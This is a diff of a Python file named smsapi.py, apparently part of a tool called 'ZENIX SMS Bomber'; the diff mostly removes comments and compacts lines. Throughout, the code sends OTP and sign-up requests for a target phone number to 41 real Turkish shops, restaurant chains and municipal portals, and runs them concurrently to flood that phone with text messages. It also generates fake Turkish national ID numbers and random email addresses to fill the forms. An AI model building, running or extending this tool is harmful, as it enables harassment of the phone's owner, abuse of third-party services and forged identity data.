@@ -1,38 +1,26 @@
-# smsapi.py — ZENIX SMS Bomber Servisleri
+# smsapi.py — ZENIX SMS Bomber Servisleri (41 Adet)
 import requests
 from random import choice, randint
 from string import ascii_lowercase
 
 
 class SmsBomber:
-    """ZENIX SMS Bomber — 41 servis desteği"""
-
     def __init__(self, phone: str, mail: str = ""):
-        # Telefon numarasını temizle
         self.phone = str(phone).lstrip("0")
-        if self.phone.startswith("+90"):
-            self.phone = self.phone[3:]
-        if self.phone.startswith("90") and len(self.phone) == 12:
-            self.phone = self.phone[2:]
-        # Mail
+        if self.phone.startswith("+90"): self.phone = self.phone[3:]
+        if self.phone.startswith("90") and len(self.phone) == 12: self.phone = self.phone[2:]
         self.mail = mail if mail else ''.join(choice(ascii_lowercase) for _ in range(22)) + "@gmail.com"
-        # TC
         self.tc = self._gen_tc()
-        # Sonuçlar
         self.results = []
 
     def _gen_tc(self):
-        rakam = [randint(1, 9)] + [randint(0, 9) for _ in range(8)]
-        rakam.append(((sum(rakam[0:9:2]) * 7) - sum(rakam[1:8:2])) % 10)
-        rakam.append(sum(rakam[:10]) % 10)
-        return "".join(str(r) for r in rakam)
+        r = [randint(1, 9)] + [randint(0, 9) for _ in range(8)]
+        r.append(((sum(r[0:9:2]) * 7) - sum(r[1:8:2])) % 10)
+        r.append(sum(r[:10]) % 10)
+        return "".join(str(x) for x in r)
 
-    def _add(self, name, ok):
-        self.results.append((name, ok))
+    def _add(self, name, ok): self.results.append((name, ok))
 
-    # ==================== 41 SERVİS ====================
-
-    # 1. kahvedunyasi.com
     def kahvedunyasi(self):
         try:
             r = requests.post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
@@ -41,7 +29,6 @@ class SmsBomber:
             self._add("kahvedunyasi.com", r.json().get("processStatus") == "Success")
         except: self._add("kahvedunyasi.com", False)
 
-    # 2. wmf.com.tr
     def wmf(self):
         try:
             r = requests.post("https://www.wmf.com.tr/users/register/",
@@ -49,14 +36,12 @@ class SmsBomber:
             self._add("wmf.com.tr", r.status_code == 202)
         except: self._add("wmf.com.tr", False)
 
-    # 3. bim.veesk.net
     def bim(self):
         try:
             r = requests.post("https://bim.veesk.net/service/v1.0/account/login", json={"phone": self.phone}, timeout=6)
             self._add("bim.veesk.net", r.status_code == 200)
         except: self._add("bim.veesk.net", False)
 
-    # 4. englishhome.com
     def englishhome(self):
         try:
             r = requests.post("https://www.englishhome.com/api/member/sendOtp",
@@ -65,7 +50,6 @@ class SmsBomber:
             self._add("englishhome.com", r.json().get("isError") == False)
         except: self._add("englishhome.com", False)
 
-    # 5. suiste.com
     def suiste(self):
         try:
             r = requests.post("https://suiste.com/api/auth/code",
@@ -74,14 +58,12 @@ class SmsBomber:
             self._add("suiste.com", r.json().get("code") == "common.success")
         except: self._add("suiste.com", False)
 
-    # 6. kimgb
     def kimgb(self):
         try:
             r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=6)
             self._add("kimgb", r.status_code == 200)
         except: self._add("kimgb", False)
 
-    # 7. evidea.com
     def evidea(self):
         try:
             r = requests.post("https://www.evidea.com/users/register/",
@@ -90,7 +72,6 @@ class SmsBomber:
             self._add("evidea.com", r.status_code == 202)
         except: self._add("evidea.com", False)
 
-    # 8. 345dijital.com
     def ucdortbes(self):
         try:
             r = requests.post("https://api.345dijital.com/api/users/register",
@@ -99,7 +80,6 @@ class SmsBomber:
             self._add("345dijital.com", r.json().get("error") != "E-Posta veya telefon zaten kayıtlı!")
         except: self._add("345dijital.com", False)
 
-    # 9. tiklagelsin.com
     def tiklagelsin(self):
         try:
             r = requests.post("https://svc.apps.tiklagelsin.com/user/graphql",
@@ -108,7 +88,6 @@ class SmsBomber:
             self._add("tiklagelsin.com", r.json().get("data", {}).get("generateOtp") == True)
         except: self._add("tiklagelsin.com", False)
 
-    # 10. naosstars.com
     def naosstars(self):
         try:
             r = requests.post("https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350",
@@ -117,7 +96,6 @@ class SmsBomber:
             self._add("naosstars.com", r.status_code == 200)
         except: self._add("naosstars.com", False)
 
-    # 11. koton.com
     def koton(self):
         try:
             r = requests.post("https://www.koton.com/users/register/",
@@ -126,7 +104,6 @@ class SmsBomber:
             self._add("koton.com", r.status_code == 202)
         except: self._add("koton.com", False)
 
-    # 12. hayatsu.com.tr
     def hayatsu(self):
         try:
             r = requests.post("https://api.hayatsu.com.tr/api/SignUp/SendOtp",
@@ -135,7 +112,6 @@ class SmsBomber:
             self._add("hayatsu.com.tr", r.json().get("is_success") == True)
         except: self._add("hayatsu.com.tr", False)
 
-    # 13. hizliecza.net
     def hizliecza(self):
         try:
             r = requests.post("https://prod.hizliecza.net/mobil/account/sendOTP",
@@ -144,7 +120,6 @@ class SmsBomber:
             self._add("hizliecza.net", r.status_code == 200)
         except: self._add("hizliecza.net", False)
 
-    # 14. metro-tr.com
     def metro(self):
         try:
             r = requests.post("https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend",
@@ -153,7 +128,6 @@ class SmsBomber:
             self._add("metro-tr.com", r.json().get("status") == "success")
         except: self._add("metro-tr.com", False)
 
-    # 15. filemarket.com.tr
     def filemarket(self):
         try:
             r = requests.post("https://api.filemarket.com.tr/v1/otp/send",
@@ -162,7 +136,6 @@ class SmsBomber:
             self._add("filemarket.com.tr", r.json().get("responseType") == "SUCCESS")
         except: self._add("filemarket.com.tr", False)
 
-    # 16. akasya.com.tr
     def akasya(self):
         try:
             r = requests.post("https://akasyaapi.poilabs.com/v1/en/sms",
@@ -171,7 +144,6 @@ class SmsBomber:
             self._add("akasya.com.tr", r.json().get("result") == "SMS sended succesfully!")
         except: self._add("akasya.com.tr", False)
 
-    # 17. akbati.com
     def akbati(self):
         try:
             r = requests.post("https://akbatiapi.poilabs.com/v1/en/sms",
@@ -180,7 +152,6 @@ class SmsBomber:
             self._add("akbati.com", r.json().get("result") == "SMS sended succesfully!")
         except: self._add("akbati.com", False)
 
-    # 18. komagene.com.tr
     def komagene(self):
         try:
             r = requests.post("https://gateway.komagene.com.tr/auth/auth/smskodugonder",
@@ -189,7 +160,6 @@ class SmsBomber:
             self._add("komagene.com.tr", r.json().get("Success") == True)
         except: self._add("komagene.com.tr", False)
 
-    # 19. porty.tech
     def porty(self):
         try:
             r = requests.post("https://panel.porty.tech/api.php?",
@@ -198,7 +168,6 @@ class SmsBomber:
             self._add("porty.tech", r.json().get("status") == "success")
         except: self._add("porty.tech", False)
 
-    # 20. tasdelen
     def tasdelen(self):
         try:
             r = requests.post("https://tasdelen.sufirmam.com:3300/mobile/send-otp",
@@ -207,7 +176,6 @@ class SmsBomber:
             self._add("tasdelen", r.json().get("result") == True)
         except: self._add("tasdelen", False)
 
-    # 21. uysalmarket.com.tr
     def uysal(self):
         try:
             r = requests.post("https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms",
@@ -216,7 +184,6 @@ class SmsBomber:
             self._add("uysalmarket.com.tr", r.status_code == 200)
         except: self._add("uysalmarket.com.tr", False)
 
-    # 22. yapp.com.tr
     def yapp(self):
         try:
             r = requests.post("https://yapp.com.tr/api/mobile/v1/register",
@@ -225,7 +192,6 @@ class SmsBomber:
             self._add("yapp.com.tr", r.status_code == 200)
         except: self._add("yapp.com.tr", False)
 
-    # 23. beefull.io
     def beefull(self):
         try:
             requests.post("https://app.beefull.io/api/inavitas-access-management/signup",
@@ -235,7 +201,6 @@ class SmsBomber:
             self._add("beefull.io", r.status_code == 200)
         except: self._add("beefull.io", False)
 
-    # 24. dominos.com.tr
     def dominos(self):
         try:
             r = requests.post("https://frontend.dominos.com.tr/api/customer/sendOtpCode",
@@ -244,7 +209,6 @@ class SmsBomber:
             self._add("dominos.com.tr", r.json().get("isSuccess") == True)
         except: self._add("dominos.com.tr", False)
 
-    # 25. frink.com.tr
     def frink(self):
         try:
             r = requests.post("https://api.frink.com.tr/api/auth/postSendOTP",
@@ -253,7 +217,6 @@ class SmsBomber:
             self._add("frink.com.tr", r.json().get("processStatus") == "SUCCESS")
         except: self._add("frink.com.tr", False)
 
-    # 26. bodrum.bel.tr
     def bodrum(self):
         try:
             r = requests.post("https://gandalf.orwi.app/api/user/requestOtp",
@@ -262,7 +225,6 @@ class SmsBomber:
             self._add("bodrum.bel.tr", r.status_code == 200)
         except: self._add("bodrum.bel.tr", False)
 
-    # 27. kofteciyusuf.com
     def kofteciyusuf(self):
         try:
             r = requests.post("https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder",
@@ -271,7 +233,6 @@ class SmsBomber:
             self._add("kofteciyusuf.com", r.json().get("Success") == True)
         except: self._add("kofteciyusuf.com", False)
 
-    # 28. orwi.app
     def orwi(self):
         try:
             r = requests.post("https://gandalf.orwi.app/api/user/requestOtp",
@@ -280,7 +241,6 @@ class SmsBomber:
             self._add("orwi.app", r.status_code == 200)
         except: self._add("orwi.app", False)
 
-    # 29. coffy.com.tr
     def coffy(self):
         try:
             r = requests.post("https://user-api-gw.coffy.com.tr/user/signup",
@@ -289,7 +249,6 @@ class SmsBomber:
             self._add("coffy.com.tr", r.status_code == 200)
         except: self._add("coffy.com.tr", False)
 
-    # 30. hamidiye.istanbul
     def hamidiye(self):
         try:
             r = requests.post("https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp",
@@ -298,7 +257,6 @@ class SmsBomber:
             self._add("hamidiye.istanbul", r.json().get("result") == True)
         except: self._add("hamidiye.istanbul", False)
 
-    # 31. money.com.tr
     def money(self):
         try:
             r = requests.post("https://www.money.com.tr/Account/ValidateAndSendOTP",
@@ -307,7 +265,6 @@ class SmsBomber:
             self._add("money.com.tr", r.json().get("resultType") == 0)
         except: self._add("money.com.tr", False)
 
-    # 32. alixavien.com.tr
     def alixavien(self):
         try:
             r = requests.post("https://www.alixavien.com.tr/api/member/sendOtp",
@@ -316,14 +273,12 @@ class SmsBomber:
             self._add("alixavien.com.tr", r.json().get("isError") == False)
         except: self._add("alixavien.com.tr", False)
 
-    # 33. jimmykey.com
     def jimmykey(self):
         try:
             r = requests.post(f"https://www.jimmykey.com/tr/p/User/SendConfirmationSms?gsm={self.phone}&gRecaptchaResponse=undefined", timeout=6)
             self._add("jimmykey.com", r.json().get("Sonuc") == True)
         except: self._add("jimmykey.com", False)
 
-    # 34. ido.com.tr
     def ido(self):
         try:
             r = requests.post("https://api.ido.com.tr/idows/v2/register",
@@ -332,7 +287,6 @@ class SmsBomber:
             self._add("ido.com.tr", r.status_code == 200)
         except: self._add("ido.com.tr", False)
 
-    # 35. littlecaesars.com.tr
     def littlecaesars(self):
         try:
             r = requests.post("https://api.littlecaesars.com.tr/api/web/Member/Register",
@@ -341,7 +295,6 @@ class SmsBomber:
             self._add("littlecaesars.com.tr", r.status_code == 200 and r.json().get("status") == True)
         except: self._add("littlecaesars.com.tr", False)
 
-    # 36. baydoner.com
     def baydoner(self):
         try:
             r = requests.post("https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp",
@@ -350,7 +303,6 @@ class SmsBomber:
             self._add("baydoner.com", r.json().get("Control") == 1)
         except: self._add("baydoner.com", False)
 
-    # 37. pidem.com.tr
     def pidem(self):
         try:
             r = requests.post("https://restashop.azurewebsites.net/graphql/",
@@ -359,7 +311,6 @@ class SmsBomber:
             self._add("pidem.com.tr", r.json()["data"]["sendOtpSms"]["resultStatus"] == "SUCCESS")
         except: self._add("pidem.com.tr", False)
 
-    # 38. yilmazticaret.net
     def yilmazticaret(self):
         try:
             r = requests.post("https://app.buyursungelsin.com/api/customer/form/checkx",
@@ -368,7 +319,6 @@ class SmsBomber:
             self._add("yilmazticaret.net", r.status_code == 200)
         except: self._add("yilmazticaret.net", False)
 
-    # 39. fatih.bel.tr
     def fatih(self):
         try:
             r = requests.post("https://ebelediye.fatih.bel.tr/Sicil/KisiUyelikKaydet",
@@ -377,7 +327,6 @@ class SmsBomber:
             self._add("fatih.bel.tr", r.status_code == 200)
         except: self._add("fatih.bel.tr", False)
 
-    # 40. sancaktepe.bel.tr
     def sancaktepe(self):
         try:
             r = requests.post("https://e-belediye.sancaktepe.bel.tr/Sicil/KisiUyelikKaydet",
@@ -386,7 +335,6 @@ class SmsBomber:
             self._add("sancaktepe.bel.tr", r.status_code == 200)
         except: self._add("sancaktepe.bel.tr", False)
 
-    # 41. bayrampasa.bel.tr
     def bayrampasa(self):
         try:
             r = requests.post("https://ebelediye.bayrampasa.bel.tr/Sicil/KisiUyelikKaydet",
@@ -395,7 +343,6 @@ class SmsBomber:
             self._add("bayrampasa.bel.tr", r.status_code == 200)
         except: self._add("bayrampasa.bel.tr", False)
 
-    # ==================== SERVİS LİSTESİ ====================
     def get_services(self):
         return [
             self.kahvedunyasi, self.wmf, self.bim, self.englishhome, self.suiste,
@@ -428,7 +375,6 @@ class SmsBomber:
             await asyncio.gather(*tasks)
 
 
-# ==================== SERVİS İSİMLERİ (LISTE İÇİN) ====================
 SERVICE_NAMES = [
     "kahvedunyasi.com", "wmf.com.tr", "bim.veesk.net", "englishhome.com",
     "suiste.com", "kimgb", "evidea.com", "345dijital.com", "tiklagelsin.com",
